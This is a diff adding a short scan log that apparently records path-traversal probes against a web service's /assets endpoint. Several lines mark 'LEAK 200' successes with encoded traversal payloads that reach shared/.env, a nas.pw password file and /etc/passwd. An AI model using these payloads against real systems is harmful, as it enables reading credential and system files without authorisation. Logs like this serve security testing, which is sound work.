@@ -1,0 +1,10 @@
+/assets/1 -> 404 application/json {"detail":"Not Found","request_id":"04aa685a028b4a8182a256ef6f893107"}
+/assets/17 -> 404 application/json {"detail":"Not Found","request_id":"fdb999a52bf74efa9adb978d001e397a"}
+/assets/new -> 404 application/json {"detail":"Not Found","request_id":"e012115276074f5abe92114a8f0dbfcc"}
+LEAK 200 fwd-slash x4 -> shared/.env :: /assets/..%2f..%2f..%2f..%2fshared%2f.env
+LEAK 200 fwd-slash x4 -> nas.pw :: /assets/..%2f..%2f..%2f..%2fshared%2fnas.pw
+LEAK 200 encoded dots :: /assets/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fshared%2f.env
+LEAK 200 absolute path :: /assets/%2fsrv%2fckam%2fshared%2f.env
+LEAK 200 /etc/passwd :: /assets/%2fetc%2fpasswd
+/docs -> 200 text/html; charset=utf-8
+/openapi.json -> 200 application/json
